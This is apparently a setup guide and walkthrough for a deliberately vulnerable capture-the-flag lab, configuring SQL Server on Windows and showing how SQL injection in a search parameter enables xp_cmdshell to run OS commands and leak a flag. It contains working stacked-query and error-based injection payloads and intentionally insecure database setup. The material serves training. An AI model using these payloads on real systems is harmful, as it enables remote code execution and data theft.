# Windows setup — real `xp_cmdshell` RCE

`xp_cmdshell` is **not supported on SQL Server on Linux** (platform limitation, all editions).
The Docker/Linux lab therefore cannot run the classic RCE step. To reproduce the finding exactly —
enable `xp_cmdshell` through the injection and run OS commands — run the **database on Windows**.

There is no official Windows *container* image for SQL Server 2019/2022, so "DB on Windows" means
installing **SQL Server Developer Edition** (free) on your Windows host. The web app still runs in
Docker and connects to the host database.

> ⚠️ Same safety rules: localhost only, fictional data, authorized learning.

---

## 1. Install SQL Server Developer Edition

1. Download **SQL Server 2019 (or 2022) Developer** — free:
   https://www.microsoft.com/sql-server/sql-server-downloads
2. Run the installer → **Basic** (or Custom). Note the instance name (default `MSSQLSERVER`).
3. Install **SQL Server Management Studio (SSMS)** or the `sqlcmd` tools if you don't have them.

## 2. Enable SQL auth + TCP (so the Docker web app can log in)

1. **SQL Server Configuration Manager** → *SQL Server Network Configuration* →
   *Protocols for MSSQLSERVER* → enable **TCP/IP**. In TCP/IP → *IP Addresses* → *IPAll*, set
   **TCP Port = 1433**. Restart the *SQL Server (MSSQLSERVER)* service.
2. Enable **Mixed Mode** auth: in SSMS → server *Properties* → *Security* →
   "SQL Server and Windows Authentication mode" → OK → restart the service.
3. Allow inbound TCP **1433** through Windows Firewall (so the Docker container can reach the host).

## 3. Seed the database (creates StoreDb, VaultDb, the `webapp` sysadmin login,
enables `xp_cmdshell`, and writes the flag)

From the repo folder, using `sqlcmd` (Windows auth `-E`, or `-U sa -P <sa-pw>`):

```cmd
sqlcmd -S localhost -E -C -v WEBAPP_PASSWORD="W3bApp_Passw0rd!" -i db\init.sql
```

Use the same `WEBAPP_PASSWORD` value that's in your `.env`. The script:
- creates `StoreDb` (~55 products) and `VaultDb` (with the decoy `Flag` table),
- creates login `webapp` and adds it to **sysadmin**,
- **enables `xp_cmdshell`** (works on Windows), and
- writes the real flag `Flag.txt` into SQL Server's working directory via `xp_cmdshell`.

## 4. Start the web app (Docker) pointed at the host DB

```cmd
copy .env.example .env   & rem if you don't have .env yet
docker compose -f docker-compose.windows.yml up --build
```

Browse to **http://localhost:8080**. If the web container can't connect, re-check step 2
(TCP 1433 + firewall) and that `WEBAPP_PASSWORD` matches what you seeded.

> No .NET SDK? This runs the app in Docker. If you'd rather run it on the host and have the .NET 8
> SDK: `cd web && set ConnectionStrings__StoreDb=Server=localhost,1433;Database=StoreDb;User ID=webapp;Password=...;Encrypt=False;TrustServerCertificate=True && dotnet run`.

---

## 5. RCE — now it works

The injection point is still `GET /search?price=`. On Windows, `xp_cmdshell` is available, so the
enable-and-run chain from your write-up works verbatim. Note Windows commands: `whoami`, `dir`
(not `ls`), `type` (not `cat`).

**Confirm you're a DBA and enable xp_cmdshell (if not already):**

```
?price='; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

(HTTP 200, no error — unlike on Linux.)

**Run a command + capture output:**

```
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'whoami';--
```

**Exfiltrate via the error channel:**

```
?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
```

→ 500 leaks e.g. `nt authority\system` (or the SQL service account). **This is code execution.**

**Find and read the flag** (`dir` then `type Flag.txt`):

```
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'dir /b';--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(line,',') FROM dbo.rce_out WHERE line IS NOT NULL))--
```

then:

```
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'type Flag.txt';--
?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
```

→ 500 leaks: `This Is The KfirVerse flag - Congrats :)`

The `Flag.txt` sits in SQL Server's working directory (the `...\MSSQL\Binn` folder). If `dir /b`
shows it elsewhere, adjust the `type` path accordingly.

---

## Notes

- The Linux/Docker lab (`docker-compose.yml`) is still fine for everything **except** the RCE step;
  there the flag is reachable via `OPENROWSET(BULK …)` file-read instead. This Windows path is the
  one that reproduces `xp_cmdshell` exactly.
- The decoy `VaultDb.dbo.Flag` (SQLi) still taunts; the real flag still requires command execution.
